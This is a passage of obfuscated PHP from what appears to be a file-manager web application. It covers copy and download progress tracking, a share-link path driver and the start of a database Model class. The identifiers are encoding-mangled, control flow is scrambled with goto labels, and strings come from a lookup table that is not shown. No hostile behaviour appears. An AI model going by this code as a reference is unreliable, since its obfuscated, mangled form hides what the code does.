Hook::bind($C–ÍÃãÃä[557], array($this, $C–ÍÃãÃä[1572])); goto eËùªΩùËÊ; e‹®Âä∂ââ: } protected function endAfter() { goto aæÍ¨„≠∏å; b‰Á¬ÃÇØå: Hook::unbind($aéÉπóÑÉ¢[583], array($this, $aéÉπóÑÉ¢[1571])); Hook::unbind($aéÉπóÑÉ¢[584], array($this, $aéÉπóÑÉ¢[1571])); Hook::unbind($aéÉπóÑÉ¢[551], array($this, $aéÉπóÑÉ¢[1572])); goto AÊÒ£¬áŒæ; EƒÈ»“…ë—: Hook::unbind($aéÉπóÑÉ¢[1576], array($this, $aéÉπóÑÉ¢[1577])); Hook::unbind($aéÉπóÑÉ¢[1578], array($this, $aéÉπóÑÉ¢[1579])); Hook::unbind($aéÉπóÑÉ¢[1580], array($this, $aéÉπóÑÉ¢[1581])); goto e¬Ëıâ∏çπ; bŒáÀ¡≥¿å: Hook::unbind($aéÉπóÑÉ¢[557], array($this, $aéÉπóÑÉ¢[1572])); Hook::unbind($aéÉπóÑÉ¢[1573], array($this, $aéÉπóÑÉ¢[1574])); Hook::unbind($aéÉπóÑÉ¢[573], array($this, $aéÉπóÑÉ¢[1575])); goto EƒÈ»“…ë—; AÊÒ£¬áŒæ: Hook::unbind($aéÉπóÑÉ¢[548], array($this, $aéÉπóÑÉ¢[1572])); Hook::unbind($aéÉπóÑÉ¢[553], array($this, $aéÉπóÑÉ¢[1572])); Hook::unbind($aéÉπóÑÉ¢[555], array($this, $aéÉπóÑÉ¢[1572])); goto bŒáÀ¡≥¿å; aæÍ¨„≠∏å: $aéÉπóÑÉ¢ =& $_SERVER[Öíæ€“”≠éÏË]; Hook::unbind($aéÉπóÑÉ¢[1564], array($this, $aéÉπóÑÉ¢[1565])); Hook::unbind($aéÉπóÑÉ¢[1119], array($this, $aéÉπóÑÉ¢[1566])); goto eƒÖœÖ≈◊Ω; eƒÖœÖ≈◊Ω: Hook::unbind($aéÉπóÑÉ¢[1567], array($this, $aéÉπóÑÉ¢[1568])); Hook::unbind($aéÉπóÑÉ¢[580], array($this, $aéÉπóÑÉ¢[1569])); Hook::unbind($aéÉπóÑÉ¢[581], array($this, $aéÉπóÑÉ¢[1570])); goto b‰Á¬ÃÇØå; e¬Ëıâ∏çπ: } public function copyMoveStart($BèÂØΩÃÀ∏, $D»Óå‚Öº≤, $aÉœ©ÙÛú¶, $Cÿ¥ˆÍÁÕ´) { goto A⁄‡ô∆«Ç; DÇç©ïíﬂﬂ: $AÉòÇˆ„∏ò[$bÍ∆ªœƒ¡ƒ[1592]] = KodIO::transferType($BèÂØΩÃÀ∏, $aÉœ©ÙÛú¶); $this->update(); goto eÀπ±—ΩÖ∑; DèÛÉ∏É”û: if (substr($D»Óå‚Öº≤, 0, strlen($A˜óıÜåˆ¡)) == $A˜óıÜåˆ¡) { return; } if (substr($Cÿ¥ˆÍÁÕ´, 0, strlen($A˜óıÜåˆ¡)) == $A˜óıÜåˆ¡) { return; } $AÉòÇˆ„∏ò =& $this->task; goto DÇç©ïíﬂﬂ; A⁄‡ô∆«Ç: $bÍ∆ªœƒ¡ƒ =& $_SERVER[Öíæ€“”≠éÏË]; self::log($bÍ∆ªœƒ¡ƒ[1591] . $D»Óå‚Öº≤ . $bÍ∆ªœƒ¡ƒ[67] . $Cÿ¥ˆÍÁÕ´); $A˜óıÜåˆ¡ = rtrim(TEMP_FILES, $bÍ∆ªœƒ¡ƒ[8]); goto DèÛÉ∏É”û; eÀπ±—ΩÖ∑: } public function updateAfter() { $E°Âí•Ñ»† =& $_SERVER[Öíæ€“”≠éÏË]; $c∆›ÿ•¥÷ç =& $this->task; if (!$c∆›ÿ•¥÷ç[$E°Âí•Ñ»†[736]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($c∆›ÿ•¥÷ç[$E°Âí•Ñ»†[1592]] == $E°Âí•Ñ»†[1192]) { return; } self::updateTask($c∆›ÿ•¥÷ç); } private static function updateTask(&$C•∑¢ÿ˘îƒ) { $D…ﬂÜ∏èÜ≥ =& $_SERVER[Öíæ€“”≠éÏË]; if ($C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1592]] == $D…ﬂÜ∏èÜ≥[1103] || $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1592]] == $D…ﬂÜ∏èÜ≥[107]) { if ($C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1586]]) { $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1589]] = $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1588]] + $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1585]]; } } else { if ($C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1592]] == $D…ﬂÜ∏èÜ≥[1193]) { if ($C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1586]] == $D…ﬂÜ∏èÜ≥[1103]) { $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1589]] = $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1588]] + $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1585]] * 0.5; } else { if ($C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1586]] == $D…ﬂÜ∏èÜ≥[107]) { $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1589]] = $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1588]] + $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1584]] * 0.5 + $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1585]] * 0.5; } } } } $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1539]] = $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1589]] / $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[736]]; if ($C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1539]] > 0) { $DµÎ◊Ô£ = timeFloat() - $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[762]] - $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1542]]; $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1543]] = $DµÎ◊Ô£ * (1 - $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1539]]) / $C•∑¢ÿ˘îƒ[$D…ﬂÜ∏èÜ≥[1539]]; } } public function addPath($aÀÇÆ·õÈ) { goto C≤‡Ω©§´£; FÉÀëÈΩÊΩ: if ($CµñÙ—¿Îò[$e£ÈÍë≈àå[29]] == $e£ÈÍë≈àå[193]) { $B—™·ù„˘£[$e£ÈÍë≈àå[1031]] += 1; } else { $B—™·ù„˘£[$e£ÈÍë≈àå[1031]] += $CµñÙ—¿Îò[$e£ÈÍë≈àå[81]][$e£ÈÍë≈àå[79]]; if ($CµñÙ—¿Îò[$e£ÈÍë≈àå[396]]) { $B—™·ù„˘£[$e£ÈÍë≈àå[1031]] += $CµñÙ—¿Îò[$e£ÈÍë≈àå[81]][$e£ÈÍë≈àå[80]] + 1; } } $B—™·ù„˘£[$e£ÈÍë≈àå[736]] += $CµñÙ—¿Îò[$e£ÈÍë≈àå[78]]; $this->update(); goto dÏﬂ ˘Õ€’; a’ ‹øéŸÜ: $CµñÙ—¿Îò = IO::infoWithChildren($aÀÇÆ·õÈ); $Eê·∞€›áΩ = $B—™·ù„˘£[$e£ÈÍë≈àå[1593]] ? $B—™·ù„˘£[$e£ÈÍë≈àå[1593]][$e£ÈÍë≈àå[1594]] : 0; $B—™·ù„˘£[$e£ÈÍë≈àå[1593]] = array($e£ÈÍë≈àå[1594] => $Eê·∞€›áΩ + 1, $e£ÈÍë≈àå[414] => $CµñÙ—¿Îò[$e£ÈÍë≈àå[28]], $e£ÈÍë≈àå[76] => $CµñÙ—¿Îò[$e£ÈÍë≈àå[76]], $e£ÈÍë≈àå[501] => $CµñÙ—¿Îò[$e£ÈÍë≈àå[501]] ? $CµñÙ—¿Îò[$e£ÈÍë≈àå[501]] : $CµñÙ—¿Îò[$e£ÈÍë≈àå[76]]); goto FÉÀëÈΩÊΩ; C≤‡Ω©§´£: $e£ÈÍë≈àå =& $_SERVER[Öíæ€“”≠éÏË]; if (!$aÀÇÆ·õÈ) { return; } $B—™·ù„˘£ =& $this->task; goto a’ ‹øéŸÜ; dÏﬂ ˘Õ€’: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($f˘¢ß–Ÿ»⁄) { $bâ€¿ÑÉî∂ =& $_SERVER[Öíæ€“”≠éÏË]; $C´·ÎÖ’öî =& $this->task; $C´·ÎÖ’öî[$bâ€¿ÑÉî∂[1582]] = $f˘¢ß–Ÿ»⁄[$bâ€¿ÑÉî∂[28]]; $C´·ÎÖ’öî[$bâ€¿ÑÉî∂[1033]] = $f˘¢ß–Ÿ»⁄[$bâ€¿ÑÉî∂[28]]; $this->update(); } public function copyFileStart($Cπ†Çó≈π«, $eÿÃÇ†≤Ù±, $Fá˘•èﬂÌ£, $dËıÛìêÒì, $A’π»∆ªﬂÓ, $D…‰–≥«≠œ) { goto A≠Áì°Øü„; céªÉïÉÙÚ: $CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[1582]] = $B∑—ÑÑç≤‰; $CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[1584]] = (int) $Cπ†Çó≈π«->size($eÿÃÇ†≤Ù±); $CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[1585]] = 0; goto C¶æ◊ôıì´; c˘∞Ì†º⁄â: $CÂ‘ì‡Üÿ” = $CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[1584]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[394]] . $B´Ω∏â∂Áí[1597]); if ($CÂ‘ì‡Üÿ” && file_exists(get_path_father($dËıÛìêÒì))) { Cache::set($CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[394]] . $B´Ω∏â∂Áí[1597], $dËıÛìêÒì); $CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[1557]] = array($B´Ω∏â∂Áí[1598], $B´Ω∏â∂Áí[1599]); } goto DÖˆÉù∑ú°; DÖˆÉù∑ú°: $this->update(0, $CÂ‘ì‡Üÿ”); goto e™¬âÜñ”í; C¶æ◊ôıì´: $CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[1033]] = $B´Ω∏â∂Áí[33]; $CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[1586]] = $B´Ω∏â∂Áí[33]; $CÿõﬂÜÿÁ≈[$B´Ω∏â∂Áí[1587]] = 0; goto c˘∞Ì†º⁄â; d∆’≥§Â≥–: $GLOBALS[$B´Ω∏â∂Áí[1596]] = $A’π»∆ªﬂÓ; $GLOBALS[$B´Ω∏â∂Áí[1595]] = $D…‰–≥«≠œ; $CÿõﬂÜÿÁ≈ =& $this->task; goto céªÉïÉÙÚ; A≠Áì°Øü„: $B´Ω∏â∂Áí =& $_SERVER[Öíæ€“”≠éÏË]; $B∑—ÑÑç≤‰ = $A’π»∆ªﬂÓ; if ($B∑—ÑÑç≤‰ == $GLOBALS[$B´Ω∏â∂Áí[1595]]) { $B∑—ÑÑç≤‰ = $GLOBALS[$B´Ω∏â∂Áí[1596]]; } goto d∆’≥§Â≥–; e™¬âÜñ”í: } public static function updateCopyLocalFileSize($b•çö·∞«ò) { goto eπ⁄â•üéÏ; d°êËë„ì≠: return $b•çö·∞«ò; goto dÉ§¶í¶„«; BÕ£Æ∏â†ë: $b•çö·∞«ò[$eéÆä÷µ£•[1585]] = @filesize($Cì¥˘Éï É); $b•çö·∞«ò[$eéÆä÷µ£•[1589]] += $b•çö·∞«ò[$eéÆä÷µ£•[1585]]; self::updateTask($b•çö·∞«ò); goto d°êËë„ì≠; eπ⁄â•üéÏ: $eéÆä÷µ£• =& $_SERVER[Öíæ€“”≠éÏË]; $Cì¥˘Éï É = Cache::get($b•çö·∞«ò[$eéÆä÷µ£•[394]] . $eéÆä÷µ£•[1597]); if (!$Cì¥˘Éï É || !file_exists($Cì¥˘Éï É)) { return $b•çö·∞«ò; } goto BÕ£Æ∏â†ë; dÉ§¶í¶„«: } public function copyFileEnd($Cê Ùõï°Œ, $bÏÊ‹£Öÿ–, $Fá¥Ó‹·, $cîèèüú÷¢, $BÕ€‹£Œ¨Õ, $b∑úÎ≥áûÃ) { goto DÙáÉŒœƒÆ; f∫›ëçòˆ·: Cache::remove($EßµàÛàÖ∫[$E®ì»ïÏ“∂[394]] . $E®ì»ïÏ“∂[1597]); self::log($E®ì»ïÏ“∂[1600] . $bÏÊ‹£Öÿ– . $E®ì»ïÏ“∂[67] . $cîèèüú÷¢ . $E®ì»ïÏ“∂[229] . $BÕ€‹£Œ¨Õ . $E®ì»ïÏ“∂[1601] . $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1582]]); goto bî ÑÑ å©; DÙáÉŒœƒÆ: $E®ì»ïÏ“∂ =& $_SERVER[Öíæ€“”≠éÏË]; $EßµàÛàÖ∫ =& $this->task; $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1585]] = $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1584]]; goto e¯À´àèùÓ; e¯À´àèùÓ: $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1586]] = $E®ì»ïÏ“∂[33]; unset($EßµàÛàÖ∫[$E®ì»ïÏ“∂[1557]]); if ($BÕ€‹£Œ¨Õ == $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1582]]) { $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1588]] += $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1584]]; $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1589]] = $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1588]]; $this->update(1); } else { $this->update(); $EßµàÛàÖ∫[$E®ì»ïÏ“∂[1585]] = 0; } goto f∫›ëçòˆ·; bî ÑÑ å©: } public function updateFileEnd($Aƒ¯à–∑ÓÉ, $C‡∫Æã¯àô) { goto B«Á¬˜…í; B«Á¬˜…í: $EÏœ÷ÀàœÖ =& $_SERVER[Öíæ€“”≠éÏË]; $EÛáó£«Ê≥ =& $this->task; $EÛáó£«Ê≥[$EÏœ÷ÀàœÖ[1582]] = $Aƒ¯à–∑ÓÉ; goto aÔäå∫‘Ó∆; DﬁäÉ§çÖ‹: $this->update(1); self::log($EÏœ÷ÀàœÖ[1602] . $Aƒ¯à–∑ÓÉ); goto fÉÕ”˜»Üü; aÔäå∫‘Ó∆: $EÛáó£«Ê≥[$EÏœ÷ÀàœÖ[1584]] = $C‡∫Æã¯àô; $EÛáó£«Ê≥[$EÏœ÷ÀàœÖ[1588]] += $C‡∫Æã¯àô; $EÛáó£«Ê≥[$EÏœ÷ÀàœÖ[1589]] = $EÛáó£«Ê≥[$EÏœ÷ÀàœÖ[1588]]; goto DﬁäÉ§çÖ‹; fÉÕ”˜»Üü: } public function sourceModelCopy($Fä—ºëôÂ¿) { goto EÛÎÓŸÿ‚Ü; CË±¶≤æ‘Â: switch ($føãå£´§Ç) { case $CƒÒ˜»«´ï[549]: $DòéØËº‹á = 1; break; case $CƒÒ˜»«´ï[552]: $a•åÁÇã≈º[$CƒÒ˜»«´ï[1582]] = $DΩœ‰â‹ƒÁ[$CƒÒ˜»«´ï[28]]; break; case $CƒÒ˜»«´ï[554]: $DòéØËº‹á = intval($Fä—ºëôÂ¿[$CƒÒ˜»«´ï[377]] * 0.4); break; case $CƒÒ˜»«´ï[556]: $DòéØËº‹á = intval($Fä—ºëôÂ¿[$CƒÒ˜»«´ï[377]] * 0.2); break; case $CƒÒ˜»«´ï[558]: $DòéØËº‹á = intval($Fä—ºëôÂ¿[$CƒÒ˜»«´ï[377]] * 0.4); break; } $this->update($DòéØËº‹á); $this->sourceModelCopyFlag = !1; goto FúÖ∆à›™±; F≈√çÖ¶âÑ: $a•åÁÇã≈º =& $this->task; $this->sourceModelCopyFlag = !0; $DòéØËº‹á = 0; goto CË±¶≤æ‘Â; EÛÎÓŸÿ‚Ü: $CƒÒ˜»«´ï =& $_SERVER[Öíæ€“”≠éÏË]; $føãå£´§Ç = $Fä—ºëôÂ¿[0]; $DΩœ‰â‹ƒÁ = $Fä—ºëôÂ¿[1]; goto F≈√çÖ¶âÑ; FúÖ∆à›™±: } public function sourceRemove($DÙòè¶≈ïÑ, $f€í‘™®îë) { $F≈©”‚Àé¿ =& $_SERVER[Öíæ€“”≠éÏË]; $this->sourceModelCopyFlag = !0; $d©∂§ÔÑÉ® = 1; if (isset($DÙòè¶≈ïÑ[$F≈©”‚Àé¿[81]])) { $d©∂§ÔÑÉ® = $DÙòè¶≈ïÑ[$F≈©”‚Àé¿[81]][$F≈©”‚Àé¿[79]] + $DÙòè¶≈ïÑ[$F≈©”‚Àé¿[81]][$F≈©”‚Àé¿[80]] + 1; } $this->update($d©∂§ÔÑÉ®); $this->sourceModelCopyFlag = !1; } public function sourceMove($FœÚ√ﬂ¨å°) { $this->sourceRemove($FœÚ√ﬂ¨å°, !1); } public function curlProgress($fÉö¡ê¯ôÇ, $DàÉÚö§¬Ñ, $dƒæ»†≠è·, $Fäﬁé¥é£õ, $aøàƒ§√Ø) { $båñÿòÖ≥ı =& $_SERVER[Öíæ€“”≠éÏË]; $B£Ë ÇëÆù =& $this->task; if ($aøàƒ§√Ø > 0) { $B£Ë ÇëÆù[$båñÿòÖ≥ı[1033]] = $båñÿòÖ≥ı[1603]; $B£Ë ÇëÆù[$båñÿòÖ≥ı[1586]] = $båñÿòÖ≥ı[107]; if ($B£Ë ÇëÆù[$båñÿòÖ≥ı[1584]]) { $B£Ë ÇëÆù[$båñÿòÖ≥ı[1585]] = $aøàƒ§√Ø; } if ($B£Ë ÇëÆù[$båñÿòÖ≥ı[1587]]) { $B£Ë ÇëÆù[$båñÿòÖ≥ı[1585]] = $aøàƒ§√Ø + $B£Ë ÇëÆù[$båñÿòÖ≥ı[1587]]; } } else { if ($dƒæ»†≠è· > 0) { if ($B£Ë ÇëÆù[$båñÿòÖ≥ı[1584]] == $DàÉÚö§¬Ñ) { $B£Ë ÇëÆù[$båñÿòÖ≥ı[1585]] = $dƒæ»†≠è·; $B£Ë ÇëÆù[$båñÿòÖ≥ı[1033]] = $båñÿòÖ≥ı[1604]; $B£Ë ÇëÆù[$båñÿòÖ≥ı[1586]] = $båñÿòÖ≥ı[1103]; } } } $this->update(); } public function curlProgressStart($C¡¨ÔƒÊ´·) { } public function curlProgressEnd($DÉß–∂í◊ï) { goto A‘ÀÃ‚’”; eà…†â·Á: $E∂ê£˜ü„Ω = $E•ﬂ≠◊¯Ó≤[$AÊ√Òö» õ[1605]]; if ($E∂ê£˜ü„Ω == -1) { $E∂ê£˜ü„Ω = $E•ﬂ≠◊¯Ó≤[$AÊ√Òö» õ[1606]]; } if ($bÇòâ≤˜ÖÇ[$AÊ√Òö» õ[1586]] == $AÊ√Òö» õ[107] && $E∂ê£˜ü„Ω) { $bÇòâ≤˜ÖÇ[$AÊ√Òö» õ[1587]] += $E∂ê£˜ü„Ω; } goto D⁄≈ÍŒº≠é; D⁄≈ÍŒº≠é: $this->update(); goto aƒ©ƒè¡ªﬂ; A‘ÀÃ‚’”: $AÊ√Òö» õ =& $_SERVER[Öíæ€“”≠éÏË]; $bÇòâ≤˜ÖÇ =& $this->task; $E•ﬂ≠◊¯Ó≤ = curl_getinfo($DÉß–∂í◊ï); goto eà…†â·Á; aƒ©ƒè¡ªﬂ: } } class TaskHttp extends Task { protected function startAfter() { $aÎüÜÁâ‡π =& $_SERVER[Öíæ€“”≠éÏË]; $Dù‹ÊóÇ∑⁄ =& $this->task; $Dù‹ÊóÇ∑⁄[$aÎüÜÁâ‡π[1607]] = 1; Hook::bind($aÎüÜÁâ‡π[1576], array($this, $aÎüÜÁâ‡π[1608])); Hook::bind($aÎüÜÁâ‡π[1578], array($this, $aÎüÜÁâ‡π[1609])); Hook::bind($aÎüÜÁâ‡π[1580], array($this, $aÎüÜÁâ‡π[1610])); } protected function endAfter() { $Fù≈îÒç‡„ =& $_SERVER[Öíæ€“”≠éÏË]; Hook::unbind($Fù≈îÒç‡„[1576], array($this, $Fù≈îÒç‡„[1608])); Hook::unbind($Fù≈îÒç‡„[1578], array($this, $Fù≈îÒç‡„[1609])); Hook::unbind($Fù≈îÒç‡„[1580], array($this, $Fù≈îÒç‡„[1610])); } public function progressStart($fß†„≤Öë∞) { $BÇñÙäŸ‚≠ =& $_SERVER[Öíæ€“”≠éÏË]; $d‰¨Ù† ß¥ = curl_getinfo($fß†„≤Öë∞); self::log($BÇñÙäŸ‚≠[1611] . $d‰¨Ù† ß¥[$BÇñÙäŸ‚≠[305]]); self::valueSet($this->task[$BÇñÙäŸ‚≠[394]], $this->task); } public function progressEnd($DÀ¯ ó‡‰í) { $c‚ÇÆííÀ÷ =& $_SERVER[Öíæ€“”≠éÏË]; self::log($c‚ÇÆííÀ÷[1612] . $this->task[$c‚ÇÆííÀ÷[394]]); $this->end(); } public function progress($Dû˘È¨ë—˜, $eºÇß™ãõò, $FÆŸ”°À°Ï, $BËâ¯™õ·§, $Añ ◊›£åâ) { $Cä¯çÿø¢“ =& $_SERVER[Öíæ€“”≠éÏË]; $eáƒ÷Øò√è =& $this->task; if ($Añ ◊›£åâ > 0) { $eáƒ÷Øò√è[$Cä¯çÿø¢“[1031]] = $eáƒ÷Øò√è[$Cä¯çÿø¢“[1031]] == 0 ? $BËâ¯™õ·§ : $eáƒ÷Øò√è[$Cä¯çÿø¢“[1031]]; $eáƒ÷Øò√è[$Cä¯çÿø¢“[1045]] = $Añ ◊›£åâ; } else { if ($FÆŸ”°À°Ï > 0) { $eáƒ÷Øò√è[$Cä¯çÿø¢“[1031]] = $eáƒ÷Øò√è[$Cä¯çÿø¢“[1031]] == 0 ? $eºÇß™ãõò : $eáƒ÷Øò√è[$Cä¯çÿø¢“[1031]]; $eáƒ÷Øò√è[$Cä¯çÿø¢“[1045]] = $FÆŸ”°À°Ï; } } $this->update(); self::log("\x70\x72\x6f\147\162\145\x73\163\110\164\x74\x70\72\x64\x6f\x77\x6e\x3a{$FÆŸ”°À°Ï}\57{$eºÇß™ãõò}\73\x20\165\x70\x6c\157\x61\144\x3a{$Añ ◊›£åâ}\57{$BËâ¯™õ·§}\x3b"); } } goto CÀöÎªÛâº; D™óÊä∂êâ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($Bà⁄°Î¥Ö”) { $this->pathParse = $Bà⁄°Î¥Ö”; $this->model = Model($_SERVER[Öíæ€“”≠éÏË][1215]); } protected function infoParse($B……∆Ñ≤™ê, $CÑæ°«©≤‡ = false, $a ¿ÈÂ‡©á = false) { $a∫åëû”™Í =& $_SERVER[Öíæ€“”≠éÏË]; return Action($a∫åëû”™Í[1079])->sharePathInfo($this->pathParse[$a∫åëû”™Í[76]], !0); } public function listPath($d°©∏„‘¡í, $C•æöë÷±ˆ = false) { $EÀ˜·¬™§∫ =& $_SERVER[Öíæ€“”≠éÏË]; $b‰≠⁄Èœ‰ü = parent::listPath($d°©∏„‘¡í, $C•æöë÷±ˆ); foreach ($b‰≠⁄Èœ‰ü as $bí…Íåµƒ« => $cì‹àÁñà“) { if (!in_array($bí…Íåµƒ«, array($EÀ˜·¬™§∫[74], $EÀ˜·¬™§∫[75]))) { continue; } foreach ($cì‹àÁñà“ as $c¥ Í∫∂œê => $dƒòıíÖÊê) { $b‰≠⁄Èœ‰ü[$bí…Íåµƒ«][$c¥ Í∫∂œê] = Action($EÀ˜·¬™§∫[1079])->shareItemInfo($dƒòıíÖÊê); } } return $b‰≠⁄Èœ‰ü; } public function listAll($F™π“òﬁíî) { goto CÃ‡–É†ÖØ; e¯åáÌ¬ûè: return $e™° ˆÈã°; goto AöÈ€±…óî; BÔ¥˜°Ωá£: $e™° ˆÈã° = $this->model->listAll($F™π“òﬁíî); foreach ($e™° ˆÈã° as &$cª‘≠–ﬂ„Ñ) { $cª‘≠–ﬂ„Ñ[$F∂œ‹º‘ŒÁ[85]] = Action($F∂œ‹º‘ŒÁ[1079])->shareItemInfo($cª‘≠–ﬂ„Ñ[$F∂œ‹º‘ŒÁ[85]]); } unset($cª‘≠–ﬂ„Ñ); goto e¯åáÌ¬ûè; CÃ‡–É†ÖØ: $F∂œ‹º‘ŒÁ =& $_SERVER[Öíæ€“”≠éÏË]; $bµ©êÂËû™ = IO::info($this->pathParse[$F∂œ‹º‘ŒÁ[76]]); if (!$bµ©êÂËû™) { return array(); } goto BÔ¥˜°Ωá£; AöÈ€±…óî: } } $Cæ›ÜÓæÓﬁ = $_SERVER[$_SERVER[Öíæ€“”≠éÏË][1223]]; $Bãßò‘øá≥ = $_SERVER[Öíæ€“”≠éÏË][846]; goto BÍ¢—àÀ‹ˆ; BØïßÌ˜Í‚: define($_SERVER[Öíæ€“”≠éÏË][240], 0); define($_SERVER[Öíæ€“”≠éÏË][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\x65", "\157\x72\x64\145\x72", "\x61\x6c\x69\x61\x73", "\150\x61\x76\x69\x6e\x67", "\147\x72\157\165\x70", "\x6c\x6f\x63\x6b", "\x64\151\x73\x74\x69\x6e\x63\164", "\x61\x75\164\157", "\x66\151\154\164\145\162", "\166\x61\x6c\151\144\141\x74\x65", "\162\x65\x73\165\x6c\x74", "\x62\151\x6e\144", "\164\157\153\x65\x6e"); public function __construct($b˜ÛÎŸ‹ÕÚ = '', $F∂πΩ‡üﬂÒ = '', $B≥◊∫⁄›£Ö = '') { $BåÈ˘º‡’Î =& $_SERVER[Öíæ€“”≠éÏË]; $this->_initialize(); if (!empty($b˜ÛÎŸ‹ÕÚ)) { if (strpos($b˜ÛÎŸ‹ÕÚ, $BåÈ˘º‡’Î[95])) { list($this->dbName, $this->name) = explode($BåÈ˘º‡’Î[95], $b˜ÛÎŸ‹ÕÚ); } else { $this->name = $b˜ÛÎŸ‹ÕÚ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F∂πΩ‡üﬂÒ)) { $this->tablePrefix = $BåÈ˘º‡’Î[33]; } elseif ($BåÈ˘º‡’Î[33] != $F∂πΩ‡üﬂÒ) { $this->tablePrefix = $F∂πΩ‡üﬂÒ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($BåÈ˘º‡’Î[242]); } $this->db(0, empty($this->connection) ? $B≥◊∫⁄›£Ö : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Eõ≠äŸô‘ƒ =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($this->fields)) { if (think_config($Eõ≠äŸô‘ƒ[243])) { $dë¡ÜÚ‡öä = $this->dbName ? $this->dbName : think_config($Eõ≠äŸô‘ƒ[244]); $dıÂœ§ºÛ€ = think_var_cache($Eõ≠äŸô‘ƒ[245] . strtolower(get_path_this($dë¡ÜÚ‡öä) . $Eõ≠äŸô‘ƒ[95] . $this->name)); if ($dıÂœ§ºÛ€) { $dµ¥ìÍ™èÇ = think_config($Eõ≠äŸô‘ƒ[246]); if (empty($dµ¥ìÍ™èÇ) || $dıÂœ§ºÛ€[$Eõ≠äŸô‘ƒ[247]] == $dµ¥ìÍ™èÇ) { $this->fields = $dıÂœ§ºÛ€; return; } } } $this->flush(); } } public function flush() { goto b•ãÙÆ‡ãñ; b•ãÙÆ‡ãñ: $dóã≤øˆ”¿ =& $_SERVER[Öíæ€“”≠éÏË]; $this->db->setModel($this->name); $Cﬁó∆˜ﬂßÜ = $this->db->getFields($this->getTableName()); goto EÿÖ‹√¶ø¨; EÿÖ‹√¶ø¨: if (!$Cﬁó∆˜ﬂßÜ) { return !1; } $this->fields = array_keys($Cﬁó∆˜ﬂßÜ); $this->fields[$dóã≤øˆ”¿[248]] = !1; goto dïÇõÆÈ¯; dïÇõÆÈ¯: foreach ($Cﬁó∆˜ﬂßÜ as $fß ´Çêî¢ => $b°ºæ∏Ô≥…) { $f„ÈÜàÀÍª[$fß ´Çêî¢] = $b°ºæ∏Ô≥…[$dóã≤øˆ”¿[29]]; if ($b°ºæ∏Ô≥…[$dóã≤øˆ”¿[36]]) { $this->fields[$dóã≤øˆ”¿[249]] = $fß ´Çêî¢; if ($b°ºæ∏Ô≥…[$dóã≤øˆ”¿[39]]) { $this->fields[$dóã≤øˆ”¿[248]] = !0; } } } $this->fields[$dóã≤øˆ”¿[250]] = $f„ÈÜàÀÍª; if (think_config($dóã≤øˆ”¿[246])) { $this->fields[$dóã≤øˆ”¿[247]] = think_config($dóã≤øˆ”¿[246]); } goto D”ú§∆¯¬√; D”ú§∆¯¬√: if (think_config($dóã≤øˆ”¿[243])) { $BÁ·ˆªÑÊ® = $this->dbName ? $this->dbName : think_config($dóã≤øˆ”¿[244]); think_var_cache($dóã≤øˆ”¿[245] . strtolower(get_path_this($BÁ·ˆªÑÊ®) . $dóã≤øˆ”¿[95] . $this->name), $this->fields); } goto Fªœæ“«Øƒ; Fªœæ“«Øƒ: } public function 